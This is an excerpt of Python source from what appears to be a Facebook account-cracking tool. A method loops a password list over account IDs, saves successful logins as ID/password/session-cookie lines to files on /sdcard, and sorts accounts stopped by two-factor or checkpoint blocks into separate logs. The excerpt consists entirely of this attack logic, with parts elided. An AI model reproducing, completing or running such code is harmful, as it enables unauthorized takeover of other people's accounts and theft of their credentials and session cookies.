...
def __M2X__(self, ids, names, passlist):
    try:
        ...
        sys.stdout.write(
            f'\r{xp}{W}-{R}<[{W}NOX{R}-{W}{R}]>{W}-{R}<[{color}{self.loop}{R}/{W}M2{R}]>{W}-{R}<[{R}{len(self.oks)}{R}/{R}{len(self.twf)}{R}/{W}{len(self.cps)}{R}]> '
        )
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                ...
                open('/sdcard/PS-/FILE/NOX-M2-OK.txt', 'a').write(ids + '/' + pas + '/' + cookie + '\n')
                self.oks.append(ids)
                break
            if twf in str(po):
                if 'y' in self.__CP__:
                ...
                open('/sdcard/PS-/FILE/NOX-M2-2F.txt', 'a').write(ids + '/' + pas + '\n')
                self.twf.append(ids)
                break
            if 'www.facebook.com' in po['error']['message']:
                ...
                open('/sdcard/PS-/FILE/NOX-M2-CP.txt', 'a').write(ids + '/' + pas + '\n')
                self.cps.append(ids)
                break
            else:
                continue
